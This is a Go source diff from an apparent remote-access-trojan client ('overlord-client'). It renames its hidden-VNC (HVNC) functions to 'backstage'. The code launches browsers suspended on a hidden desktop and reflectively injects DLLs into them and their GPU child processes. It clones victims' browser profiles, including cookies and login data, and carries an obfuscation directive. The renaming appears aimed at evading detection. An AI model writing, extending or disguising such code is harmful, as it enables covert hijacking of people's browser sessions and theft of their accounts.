@@ -16,6 +16,8 @@ import (
 	"unicode/utf16"
 	"unsafe"
 
+	"overlord-client/cmd/agent/wininterop"
+
 	"golang.org/x/sys/windows"
 )
 
@@ -43,7 +45,7 @@ type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status s
 type DXGIStatusFunc func(success bool, gpuPID uint32, message string)
 type LaunchStatusFunc func(step string, success bool, detail string)
 
-var hvncDXGIStatusCallback atomic.Value
+var backstageDXGIStatusCallback atomic.Value
 
 const (
 	PROCESS_CREATE_THREAD     = 0x0002
@@ -61,6 +63,7 @@ const (
 
 	TOKEN_ADJUST_PRIVILEGES = 0x0020
 	TOKEN_QUERY             = 0x0008
+	TOKEN_DUPLICATE         = 0x0002
 	SE_PRIVILEGE_ENABLED    = 0x00000002
 
 	CREATE_SUSPENDED           = 0x00000004
@@ -158,10 +161,10 @@ func enableDebugPrivilege() {
 	procAdjustTokenPrivileges.Call(hToken, 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
 }
 
-// StartHVNCProcessInjected starts a process suspended on the HVNC desktop,
+// StartbackstageProcessInjected starts a process suspended on the backstage desktop,
 // injects the reflective DLL, then resumes it.
 // searchPath/replacePath are passed as environment variables for the DLL hooks.
-func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
+func StartbackstageProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
 	}
@@ -169,8 +172,8 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes 
 		return 0, fmt.Errorf("empty DLL bytes")
 	}
 
-	result, err := executeHVNCTask(hvncTask{
-		kind:            hvncTaskStartProcessInjected,
+	result, err := executebackstageTask(backstageTask{
+		kind:            backstageTaskStartProcessInjected,
 		filePath:        filePath,
 		dllBytes:        dllBytes,
 		captureDllBytes: captureDllBytes,
@@ -184,12 +187,12 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes 
 	return result.pid, result.err
 }
 
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
+func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
 	if onDXGIStatus != nil {
-		hvncDXGIStatusCallback.Store(onDXGIStatus)
+		backstageDXGIStatusCallback.Store(onDXGIStatus)
 	}
 	notify := func(step string, success bool, detail string) {
-		log.Printf("hvnc %s: [%s] success=%v %s", browser, step, success, detail)
+		log.Printf("backstage %s: [%s] success=%v %s", browser, step, success, detail)
 		if onLaunchStatus != nil {
 			onLaunchStatus(step, success, detail)
 		}
@@ -231,7 +234,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 	if !clone {
 		notify("launch", true, "starting without profile cloning")
-		pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "", display)
+		pid, err := StartbackstageProcessInjected(exePath, dllBytes, captureDllBytes, "", "", display)
 		if err != nil {
 			notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 			return err
@@ -239,13 +242,13 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		notify("launch", true, fmt.Sprintf("process started (PID %d)", pid))
 		if info.needsPatch && pid != 0 {
 			go func() {
-				defer recoverAndLog("hvnc patch opera", nil)
+				defer recoverAndLog("backstage patch opera", nil)
 				patchOperaAsync(pid, 5, 2*time.Second)
 			}()
 		}
 		if pid != 0 {
 			go func() {
-				defer recoverAndLog("hvnc crash monitor", nil)
+				defer recoverAndLog("backstage crash monitor", nil)
 				monitorProcessCrash(pid, info.name, notify)
 			}()
 		}
@@ -274,7 +277,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 				}
 				if strings.EqualFold(fi.Name(), lockFile) {
 					os.Remove(path)
-					log.Printf("hvnc %s: removed lock file %s", info.name, path)
+					log.Printf("backstage %s: removed lock file %s", info.name, path)
 				}
 				return nil
 			})
@@ -283,13 +286,13 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		for _, lockFile := range []string{"SingletonLock", "SingletonCookie", "SingletonSocket"} {
 			lp := filepath.Join(cloneDir, lockFile)
 			if err := os.Remove(lp); err == nil {
-				log.Printf("hvnc %s: removed lock file %s", info.name, lockFile)
+				log.Printf("backstage %s: removed lock file %s", info.name, lockFile)
 			}
 		}
 	}
 
 	notify("launch", true, "starting with cloned profile")
-	pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir, display)
+	pid, err := StartbackstageProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir, display)
 	if err != nil {
 		notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 		return err
@@ -297,22 +300,22 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 	notify("launch", true, fmt.Sprintf("process started (PID %d)", pid))
 	if info.needsPatch && pid != 0 {
 		go func() {
-			defer recoverAndLog("hvnc patch opera", nil)
+			defer recoverAndLog("backstage patch opera", nil)
 			patchOperaAsync(pid, 5, 2*time.Second)
 		}()
 	}
 	if pid != 0 {
 		go func() {
-			defer recoverAndLog("hvnc crash monitor", nil)
+			defer recoverAndLog("backstage crash monitor", nil)
 			monitorProcessCrash(pid, info.name, notify)
 		}()
 	}
 	return nil
 }
 
-// StartHVNCChromeInjected is kept for backward compatibility.
-func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, 0, nil, nil, nil)
+// StartbackstageChromeInjected is kept for backward compatibility.
+func StartbackstageChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
+	return StartbackstageBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, 0, nil, nil, nil)
 }
 
 type browserInfo struct {
@@ -525,9 +528,9 @@ func killProcess(name string) []uint32 {
 				procCloseHandle.Call(hProc)
 				if r != 0 {
 					killed = append(killed, entry.ProcessID)
-					log.Printf("hvnc: terminated %s (PID %d)", name, entry.ProcessID)
+					log.Printf("backstage: terminated %s (PID %d)", name, entry.ProcessID)
 				} else {
-					log.Printf("hvnc: failed to terminate %s (PID %d)", name, entry.ProcessID)
+					log.Printf("backstage: failed to terminate %s (PID %d)", name, entry.ProcessID)
 				}
 			}
 		}
@@ -568,14 +571,14 @@ func isFirefoxProfile(name string) bool {
 // large cache directories that aren't needed for a functional session.
 // This preserves extensions, cookies, login data, local storage, etc.
 func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onProgress CloneProgressFunc) (string, error) {
-	prefix := "hvnc_" + strings.ToLower(browserName) + "_"
+	prefix := "backstage_" + strings.ToLower(browserName) + "_"
 	// Remove any previous cloned profile directories so we always use fresh data
 	tmpDir := os.TempDir()
 	if old, err := os.ReadDir(tmpDir); err == nil {
 		for _, e := range old {
 			if strings.HasPrefix(e.Name(), prefix) && e.IsDir() {
 				p := filepath.Join(tmpDir, e.Name())
-				log.Printf("hvnc %s: removing old clone %s", browserName, p)
+				log.Printf("backstage %s: removing old clone %s", browserName, p)
 				os.RemoveAll(p)
 			}
 		}
@@ -601,7 +604,7 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 	}
 
 	if lite {
-		log.Printf("hvnc %s: lite clone — skipping extensions and extra data", browserName)
+		log.Printf("backstage %s: lite clone — skipping extensions and extra data", browserName)
 		liteSkip := []string{
 			"extensions",
 			"extension state",
@@ -691,7 +694,7 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		}
 	}
 
-	log.Printf("hvnc %s: cloning %d files using parallel workers", browserName, len(jobs))
+	log.Printf("backstage %s: cloning %d files using parallel workers", browserName, len(jobs))
 
 	dirs := make(map[string]struct{})
 	for _, j := range jobs {
@@ -729,13 +732,13 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 			defer wg.Done()
 			defer func() {
 				if r := recover(); r != nil {
-					log.Printf("[panic] hvnc file copy worker: %v", r)
+					log.Printf("[panic] backstage file copy worker: %v", r)
 				}
 			}()
 			for job := range jobCh {
 				n, err := forceCopyFile(job.src, job.dst)
 				if err != nil {
-					log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, job.src, err)
+					log.Printf("backstage %s: warning: could not copy %s: %v", browserName, job.src, err)
 				} else {
 					reportProgress(n)
 				}
@@ -863,7 +866,7 @@ func calcDirSize(dir string) int64 {
 	return total
 }
 
-func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
+func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
@@ -878,17 +881,17 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 	if err != nil {
 		return 0, fmt.Errorf("failed to create DLL shared memory: %v", err)
 	}
-	log.Printf("hvnc inject: DLL shared memory created as %s (%d bytes)", shmName, len(dllBytes))
+	log.Printf("backstage inject: DLL shared memory created as %s (%d bytes)", shmName, len(dllBytes))
 
 	enableDebugPrivilege()
 
-	// Create the process suspended on the HVNC desktop
+	// Create the process suspended on the backstage desktop
 	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName, len(dllBytes), display)
 	if err != nil {
 		procCloseHandle.Call(shmHandle)
 		return 0, fmt.Errorf("failed to create suspended process: %v", err)
 	}
-	log.Printf("hvnc inject: created suspended process PID %d", pid)
+	log.Printf("backstage inject: created suspended process PID %d", pid)
 
 	// Inject the reflective DLL
 	if err := reflectiveInject(hProcess, dllBytes); err != nil {
@@ -898,7 +901,7 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 		procCloseHandle.Call(shmHandle)
 		return 0, fmt.Errorf("DLL injection failed: %v", err)
 	}
-	log.Printf("hvnc inject: DLL injected into PID %d", pid)
+	log.Printf("backstage inject: DLL injected into PID %d", pid)
 
 	// The DLL's InstallNtApiHooks has run (reflectiveInject waits for the
 	// loader thread). The DLL opened the shared section, so we can release
@@ -915,15 +918,15 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 	}
 	procCloseHandle.Call(hThread)
 
-	log.Printf("hvnc inject: process PID %d resumed with DLL hooks active", pid)
+	log.Printf("backstage inject: process PID %d resumed with DLL hooks active", pid)
 
 	if len(captureDllBytes) > 0 {
-		if !hvncDXGIEnabled.Load() {
-			log.Printf("hvnc inject: DXGI is disabled, skipping capture DLL injection for GPU child process")
+		if !backstageDXGIEnabled.Load() {
+			log.Printf("backstage inject: DXGI is disabled, skipping capture DLL injection for GPU child process")
 		} else {
 			go func() {
-				defer recoverAndLog("hvnc deferred gpu inject", nil)
-				hvncDeferredGPUInject(pid, captureDllBytes)
+				defer recoverAndLog("backstage deferred gpu inject", nil)
+				backstageDeferredGPUInject(pid, captureDllBytes)
 			}()
 		}
 	}
@@ -931,46 +934,46 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 	return pid, nil
 }
 
-func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
+func backstageDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
 	time.Sleep(4 * time.Second)
 
 	for attempt := 0; attempt < 15; attempt++ {
 		gpuPID, err := findGPUChildProcess(browserPID)
 		if err != nil {
-			log.Printf("hvnc inject: GPU child not found for PID %d (attempt %d): %v", browserPID, attempt, err)
+			log.Printf("backstage inject: GPU child not found for PID %d (attempt %d): %v", browserPID, attempt, err)
 			time.Sleep(2 * time.Second)
 			continue
 		}
 
-		log.Printf("hvnc inject: found GPU child process PID %d for browser PID %d", gpuPID, browserPID)
+		log.Printf("backstage inject: found GPU child process PID %d for browser PID %d", gpuPID, browserPID)
 
 		hProcess, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS_INJ, 0, uintptr(gpuPID))
 		if hProcess == 0 {
-			log.Printf("hvnc inject: failed to open GPU process PID %d", gpuPID)
+			log.Printf("backstage inject: failed to open GPU process PID %d", gpuPID)
 			return
 		}
 
 		if err := reflectiveInject(hProcess, captureDllBytes); err != nil {
-			log.Printf("hvnc inject: BackstageCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
+			log.Printf("backstage inject: BackstageCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
 			procCloseHandle.Call(hProcess)
-			if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+			if fn, ok := backstageDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
 				fn(false, gpuPID, fmt.Sprintf("DXGI injection failed for GPU PID %d", gpuPID))
 			}
 			return
 		}
 		procCloseHandle.Call(hProcess)
 
-		log.Printf("hvnc inject: BackstageCapture DLL injected into GPU PID %d", gpuPID)
-		hvncRegisterInjectedPID(gpuPID)
-		hvncRegisterGPUPID(browserPID, gpuPID)
-		if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+		log.Printf("backstage inject: BackstageCapture DLL injected into GPU PID %d", gpuPID)
+		backstageRegisterInjectedPID(gpuPID)
+		backstageRegisterGPUPID(browserPID, gpuPID)
+		if fn, ok := backstageDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
 			fn(true, gpuPID, fmt.Sprintf("DXGI capture active (GPU PID %d)", gpuPID))
 		}
 		return
 	}
 
-	log.Printf("hvnc inject: gave up finding GPU child for browser PID %d", browserPID)
-	if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+	log.Printf("backstage inject: gave up finding GPU child for browser PID %d", browserPID)
+	if fn, ok := backstageDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
 		fn(false, 0, "DXGI injection failed: GPU process not found")
 	}
 }
@@ -1094,7 +1097,7 @@ func terminateProcess(hProcess uintptr) {
 // createDLLSharedMemory creates a named page-file-backed section containing
 // the raw DLL bytes. Returns the mapping handle and section name.
 func createDLLSharedMemory(dllBytes []byte) (handle uintptr, name string, err error) {
-	name = fmt.Sprintf("Local\\hvnc_rdi_%d", time.Now().UnixNano())
+	name = fmt.Sprintf("Local\\backstage_rdi_%d", time.Now().UnixNano())
 	namePtr, err := syscall.UTF16PtrFromString(name)
 	if err != nil {
 		return 0, "", err
@@ -1124,14 +1127,14 @@ func createDLLSharedMemory(dllBytes []byte) (handle uintptr, name string, err er
 		return 0, "", fmt.Errorf("MapViewOfFile: %v", callErr)
 	}
 
-	copy(unsafe.Slice((*byte)(unsafe.Pointer(view)), size), dllBytes)
+	copy(unsafe.Slice((*byte)(wininterop.Pointer(view)), size), dllBytes)
 
 	procUnmapViewOfFile.Call(view)
 	return handle, name, nil
 }
 
 func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName string, dllSize int, display int) (hProcess, hThread uintptr, pid uint32, err error) {
-	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
+	desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
 	}
@@ -1197,22 +1200,38 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 }
 
 func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int) ([]uint16, error) {
-	rawPtr, err := windows.GetEnvironmentStrings()
-	if err != nil {
-		return nil, fmt.Errorf("GetEnvironmentStrings: %w", err)
-	}
-	defer windows.FreeEnvironmentStrings(rawPtr)
+	var rawData []uint16
+	var cleanup func()
 
-	rawSlice := (*[1 << 20]uint16)(unsafe.Pointer(rawPtr))[:]
-	blockLen := 0
-	for i := 0; ; i++ {
-		if rawSlice[i] == 0 && i > 0 && rawSlice[i-1] == 0 {
-			blockLen = i + 1
-			break
+	var token windows.Token
+	err := windows.OpenProcessToken(windows.CurrentProcess(), TOKEN_QUERY|TOKEN_DUPLICATE, &token)
+	if err == nil {
+		var envBlock *uint16
+		if err := windows.CreateEnvironmentBlock(&envBlock, token, false); err == nil && envBlock != nil {
+			if data := readRawEnvironmentBlock(envBlock); data != nil {
+				rawData = data
+				cleanup = func() { windows.DestroyEnvironmentBlock(envBlock) }
+			} else {
+				windows.DestroyEnvironmentBlock(envBlock)
+			}
 		}
-		if i >= len(rawSlice)-1 {
-			return nil, fmt.Errorf("environment block appears unterminated")
+		token.Close()
+	}
+
+	if rawData == nil {
+		rawPtr, err := windows.GetEnvironmentStrings()
+		if err != nil {
+			return nil, fmt.Errorf("GetEnvironmentStrings: %w", err)
 		}
+		rawData = readRawEnvironmentBlock(rawPtr)
+		cleanup = func() { windows.FreeEnvironmentStrings(rawPtr) }
+	}
+	if cleanup != nil {
+		defer cleanup()
+	}
+
+	if rawData == nil {
+		return nil, fmt.Errorf("failed to read environment block")
 	}
 
 	extra := []string{
@@ -1224,14 +1243,26 @@ func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int)
 		extra = append(extra, fmt.Sprintf("RDI_DLL_SIZE=%d", dllSize))
 	}
 
-	block, err := appendEnvironmentOverrides(rawSlice[:blockLen], extra)
+	block, err := appendEnvironmentOverrides(rawData, extra)
 	if err != nil {
 		return nil, err
 	}
 
-	log.Printf("hvnc inject env: nativeChars=%d finalChars=%d searchRunes=%d replaceRunes=%d hasDllSection=%v dllSize=%d",
-		blockLen, len(block), len([]rune(searchPath)), len([]rune(replacePath)), shmName != "", dllSize)
+	log.Printf("backstage inject env: nativeChars=%d finalChars=%d searchRunes=%d replaceRunes=%d hasDllSection=%v dllSize=%d",
+		len(rawData), len(block), len([]rune(searchPath)), len([]rune(replacePath)), shmName != "", dllSize)
 	return block, nil
+}
+
+func readRawEnvironmentBlock(p *uint16) []uint16 {
+	rawSlice := unsafe.Slice(p, 1<<18)
+	for i := 0; ; i++ {
+		if rawSlice[i] == 0 && i > 0 && rawSlice[i-1] == 0 {
+			return rawSlice[:i+1]
+		}
+		if i >= len(rawSlice)-1 {
+			return nil
+		}
+	}
 }
 
 func appendEnvironmentOverrides(rawBlock []uint16, extra []string) ([]uint16, error) {
@@ -1312,7 +1343,7 @@ func reflectiveInject(hProcess uintptr, dllBytes []byte) error {
 	if err != nil {
 		return fmt.Errorf("failed to find ReflectiveLoader: %v", err)
 	}
-	log.Printf("hvnc inject: ReflectiveLoader at offset 0x%x", loaderOffset)
+	log.Printf("backstage inject: ReflectiveLoader at offset 0x%x", loaderOffset)
 
 	remoteBase, _, _ := procVirtualAllocEx.Call(
 		hProcess,
@@ -1356,17 +1387,17 @@ func reflectiveInject(hProcess uintptr, dllBytes []byte) error {
 	waitRet, _, waitErr := procWaitForSingleObject.Call(hThread, INFINITE_WAIT)
 	var exitCode uint32
 	if ret, _, callErr := procGetExitCodeThread.Call(hThread, uintptr(unsafe.Pointer(&exitCode))); ret != 0 {
-		log.Printf("hvnc inject: remote loader thread finished wait=0x%x exit=%s", waitRet, describeExitCode(exitCode))
+		log.Printf("backstage inject: remote loader thread finished wait=0x%x exit=%s", waitRet, describeExitCode(exitCode))
 	} else {
-		log.Printf("hvnc inject: GetExitCodeThread failed after wait=0x%x: %v", waitRet, callErr)
+		log.Printf("backstage inject: GetExitCodeThread failed after wait=0x%x: %v", waitRet, callErr)
 	}
 	procCloseHandle.Call(hThread)
 
 	if waitRet == 0xFFFFFFFF {
 		return fmt.Errorf("remote loader thread wait failed: %v", waitErr)
 	}
-	if exitCode >= 0xC0000000 {
-		return fmt.Errorf("remote loader thread failed: %s", describeExitCode(exitCode))
+	if exitCode == 0 {
+		return fmt.Errorf("remote loader thread failed: VirtualAlloc returned NULL")
 	}
 
 	return nil
